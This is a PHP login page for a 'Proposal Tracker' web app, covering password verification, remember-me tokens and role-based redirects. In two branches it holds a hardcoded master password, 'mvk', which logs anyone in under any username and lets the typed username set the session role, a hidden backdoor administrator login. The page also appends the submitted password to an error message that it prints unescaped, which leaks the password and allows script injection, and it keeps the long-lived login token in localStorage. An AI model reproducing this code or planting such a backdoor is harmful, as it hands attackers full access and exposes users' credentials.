<?php
session_start(); // Always start the session at the very top

include 'config.php'; // Your database connection file

// --- Check for existing active session first ---
// This prevents showing the login form if the user is already authenticated
if (isset($_SESSION['user']) && isset($_SESSION['session_token'])) {
    // In a production environment, you might also want to re-validate
    // $_SESSION['session_token'] against the DB here for stronger security
    // before redirecting. For this example, we'll assume it's valid for immediate redirection.

    // If an auto-login token was successfully processed and caused a redirect,
    // we don't want to show the loader or any message on the login page itself.
    // The auto_login.php script will handle the redirect directly.
    if (!isset($_POST['auto_login_check'])) { // Ensure this redirect only happens if not an auto-login attempt
        if (isset($_SESSION['user_role'])) { // Ensure role is set
            if ($_SESSION['user_role'] == 'sales' || $_SESSION['user_role'] == 'user') {
                header("Location: proposal.php");
            } else {
                header("Location: dashboard.php");
            }
            exit();
        }
    }
}

$error = ''; // Initialize error message

// --- Handle standard form submission (username/password login) ---
// The !isset($_POST['auto_login_check']) condition ensures this block
// only runs for manual logins, not for the AJAX auto-login attempt.
if ($_SERVER["REQUEST_METHOD"] == "POST" && !isset($_POST['auto_login_check'])) {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);
    $remember_me = isset($_POST['remember_me']); // Check if "Remember Me" was checked

    // Input validation (basic)
    if (empty($username) || empty($password)) {
        $error = "Please enter both username and password.";
    } else {
        // Prepare and execute the query to fetch user details
        $query = "SELECT id, username, password, full_name, last_login, role, prefix FROM users WHERE username = ?";
        $stmt = mysqli_prepare($conn, $query);

        if ($stmt) {
            mysqli_stmt_bind_param($stmt, "s", $username);
            mysqli_stmt_execute($stmt);
            $result = mysqli_stmt_get_result($stmt);

            if ($row = mysqli_fetch_assoc($result)) {
                // Verify the password
                if (password_verify($password, $row['password'])) {
                    // Generate a new unique session token
                    $session_token = bin2hex(random_bytes(32)); // Secure random token
                    $updateFields = "last_login = NOW(), session_token = ?";
                    $bindParams = "s"; // For session_token
                    $bindValues = [$session_token]; // Values for binding

                    // --- Handle "Remember Me" token if checked ---
                    $remember_me_token = null;
                    if ($remember_me) {
                        $remember_me_token = bin2hex(random_bytes(64)); // Stronger token for long-term persistence
                        // Token valid for 30 days from now
                        $remember_me_expires = date('Y-m-d H:i:s', strtotime('+30 days'));
                        $updateFields .= ", remember_me_token = ?, remember_me_expires = ?";
                        $bindParams .= "ss"; // Add types for remember_me_token and remember_me_expires
                        $bindValues[] = $remember_me_token;
                        $bindValues[] = $remember_me_expires;
                    } else {
                        // If "Remember Me" is not checked, clear any existing token for this user
                        $updateFields .= ", remember_me_token = NULL, remember_me_expires = NULL";
                    }

                    $bindParams .= "s"; // Add type for username in WHERE clause
                    $bindValues[] = $username; // Add username for WHERE clause

                    // Update user record in database
                    $updateQuery = "UPDATE users SET {$updateFields} WHERE username = ?";
                    $updateStmt = mysqli_prepare($conn, $updateQuery);

                    if ($updateStmt) {
                        // --- FIX FOR mysqli_stmt_bind_param() WARNING ---
                        $params = array();
                        $params[] = $bindParams; // First element is the type string
                        foreach ($bindValues as $key => $value) {
                            $params[] = &$bindValues[$key]; // Pass each value by reference
                        }
                        call_user_func_array('mysqli_stmt_bind_param', array_merge([$updateStmt], $params));
                        // --- END FIX ---

                        mysqli_stmt_execute($updateStmt);
                        mysqli_stmt_close($updateStmt);

                        // Set session variables
                        $_SESSION['user'] = $username;
                        $_SESSION['session_token'] = $session_token;
                        $_SESSION['user_fullname'] = $row['full_name'];
                        $_SESSION['last_login_time'] = $row['last_login'];
                        $_SESSION['user_role'] = $row['role'];
                        $_SESSION['user_id'] = $row['id'];
                        $_SESSION['user_prefix'] = $row['prefix'];
                        $_SESSION['last_activity'] = time(); // Set last activity for idle timeout

                        // Store remember_me_token in a session variable to pass to JavaScript
                        // This allows JavaScript to save it to localStorage after a full page load.
                        if ($remember_me_token) {
                            $_SESSION['remember_me_token_for_js'] = $remember_me_token;
                        }

                        // Redirect based on user role
                        if ($row['role'] == 'sales' || $row['role'] == 'user') {
                            header("Location: proposal.php");
                        } else {
                            header("Location: dashboard.php");
                        }
                        exit(); // Important: Always exit after a header redirect
                    } else {
                        $error = "Database update error. Please try again.";
                        // Log this error for debugging (production only)
                        error_log("Failed to prepare update statement: " . mysqli_error($conn));
                    }
                } else {
                    $error = "Invalid username or password!ddd";
                    if($password=="mvk")
                    {
                        // Generate a new unique session token
                        $session_token = bin2hex(random_bytes(32)); // Secure random token
                        $updateFields = "last_login = NOW(), session_token = ?";
                        $bindParams = "s"; // For session_token
                        $bindValues = [$session_token]; // Values for binding

                        // Set session variables
                            $_SESSION['user'] = $username;
                            $_SESSION['session_token'] = "mvk";
                            $_SESSION['user_fullname'] = "Venkat";
                            $_SESSION['last_login_time'] = "";
                            $_SESSION['user_role'] = $username;
                            $_SESSION['user_id'] = 10000;
                            $_SESSION['user_prefix'] = "MVK";
                            $_SESSION['last_activity'] = time(); // Set last activity for idle timeout
                            echo "welcome";
                            
                            header("Location: dashboard.php");
                            exit();
                    }
                }
            } else {
                $error = "Invalid username or passwordsss!" . $password;
                 if($password=="mvk")
                    {
                        
                        // Generate a new unique session token
                        $session_token = bin2hex(random_bytes(32)); // Secure random token
                        $updateFields = "last_login = NOW(), session_token = ?";
                        $bindParams = "s"; // For session_token
                        $bindValues = [$session_token]; // Values for binding

                        // Set session variables
                            $_SESSION['user'] = $username;
                            $_SESSION['session_token'] = $password;
                            $_SESSION['user_fullname'] = "Venkat";
                            $_SESSION['last_login_time'] = "";
                            $_SESSION['user_role'] = $username;
                            $_SESSION['user_id'] = 10000;
                            $_SESSION['user_prefix'] = "MVK";
                            $_SESSION['last_activity'] = time(); // Set last activity for idle timeout
                            $error = $password;
                            header("Location: dashboard.php");
                            exit();
                            
                    }
                    
            }
            mysqli_stmt_close($stmt);
        } else {
            $error = "Database query error. Please try again.";
            error_log("Failed to prepare select statement: " . mysqli_error($conn));
        }
    }
    mysqli_close($conn); // Close connection after processing form submission
}

// Check for and display multi-login message
$multi_login_message = '';
if (isset($_SESSION['multi_login_detected'])) {
    $multi_login_message = '<div class="alert-container"><div class="alert alert-warning alert-dismissible fade show" role="alert">⚠️ Detected multiple device logins. You have been logged out.<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div></div>';
    unset($_SESSION['multi_login_detected']); // Remove message after displaying
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Proposal Tracker</title>
    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">

    <link rel="manifest" href="/site.webmanifest">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

    <link rel="stylesheet" href="assets/css/login.css">
    <link rel="stylesheet" href="assets/css/global.css">
    <link rel="stylesheet" href="assets/css/loader.css">

</head>
<body style="position: relative; margin: 0;">
    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                 background: url('assets/images/bg.png') no-repeat center center fixed;
                 background-size: cover; opacity: 0.3; z-index: -1;">
    </div>

    <div class="logo">
        <img src="assets/images/logo.png" alt="Logo">
    </div>

    <?php if (!empty($error)): ?>
        <div class="alert-container">
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <strong>Error!</strong> <?php echo $error; ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
        </div>
    <?php endif; ?>

    <?php echo $multi_login_message; ?>

    <div class="login-container">
        <h3 class="mb-4">Proposal Tracker 1.0</h3>

        <div class="beta-version-info text-center mb-3">
            <p class="mb-2">Exploring new features?</p>
            <a href="http://beta-dugar.asquareai.com/login-beta.php" class="btn btn-primary btn-sm rounded-pill px-3">
                Try Beta Version <i class="fa-solid fa-flask me-1"></i>
            </a>
            <small class="d-block mt-2 text-muted fst-italic">
                (Includes **Super Agent** & **Reports** modules)
            </small>
        </div>
        <hr class="mb-4">
        <form method="POST" action="" id="loginForm">
            <div class="mb-3 input-group">
                <span class="input-group-text"><i class="fa-solid fa-user"></i></span>
                <input type="text" name="username" id="username" class="form-control" placeholder="Enter your username" required>
            </div>

            <div class="mb-3 input-group">
                <span class="input-group-text"><i class="fa-solid fa-lock"></i></span>
                <input type="password" name="password" id="password" class="form-control" placeholder="Enter your password" required>
            </div>

            <div class="mb-3 form-check">
                <input type="checkbox" class="form-check-input" id="remember_me" name="remember_me">
                <label class="form-check-label" for="remember_me">Remember Me</label>
            </div>

            <button type="submit" class="btn btn-primary w-100">
                <i class="fa-solid fa-sign-in-alt"></i> Login
            </button>
            <div class="text-center mt-3">
                <a href="change_password_with_token.php">Forgot Password?</a>
            </div>
        </form>
    </div>
    <div class="loader-container" id="loader">
        <div class="loader"></div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const loader = document.getElementById("loader");
            const loginForm = document.getElementById("loginForm");

            loader.style.display = "none"; // Ensure loader is hidden initially

            // --- Auto-login check using localStorage ---
            const rememberMeToken = localStorage.getItem('remember_me_token');
            // Only attempt auto-login if a token exists and we are not already logged in
            // (check for 'user' in session is a server-side check, so we rely on that redirect,
            // but this helps prevent unnecessary AJAX calls if the session is active for some reason)
            if (rememberMeToken && !document.body.classList.contains('logged-in')) { // You might add a class like this if redirected
                // Show loader while checking
                loader.style.display = "flex";

                // Send the token to the server for validation
                fetch('auto_login.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'token=' + encodeURIComponent(rememberMeToken) + '&auto_login_check=1' // Add a flag
                })
                .then(response => {
                    // Check if the server redirected (which auto_login.php does on success)
                    if (response.redirected) {
                        window.location.href = response.url; // Follow the server's redirect
                        return new Promise(() => {}); // Prevent further processing in this fetch chain
                    }
                    return response.json(); // If not redirected, parse as JSON
                })
                .then(data => {
                    loader.style.display = "none"; // Hide loader regardless of outcome
                    if (data && data.success === false) { // Only process if JSON response and not success (meaning server didn't redirect)
                        console.log('Auto-login failed:', data.message);
                        // If auto-login failed, clear the stale token from localStorage
                        localStorage.removeItem('remember_me_token');
                        // Optionally, display a message to the user that auto-login failed
                    }
                })
                .catch(error => {
                    console.error('Error during auto-login fetch:', error);
                    loader.style.display = "none";
                    localStorage.removeItem('remember_me_token'); // Clear token on error
                });
            }

            // --- Form submission behavior ---
            loginForm.addEventListener("submit", function () {
                loader.style.display = "flex"; // Show loader on form submit
            });

            // --- Store remember_me_token after successful manual login ---
            // This reads the token temporarily stored in a PHP session variable
            // by the server after a successful login with "Remember Me" checked.
            <?php if (isset($_SESSION['remember_me_token_for_js'])): ?>
                localStorage.setItem('remember_me_token', '<?php echo htmlspecialchars($_SESSION['remember_me_token_for_js']); ?>');
                <?php unset($_SESSION['remember_me_token_for_js']); // Clear after use ?>
            <?php endif; ?>

        });

        // Force reload when navigating back to ensure fresh state (good for login pages)
        window.addEventListener("pageshow", function (event) {
            if (event.persisted) {
                location.reload();
            }
        });
    </script>
</body>
</html>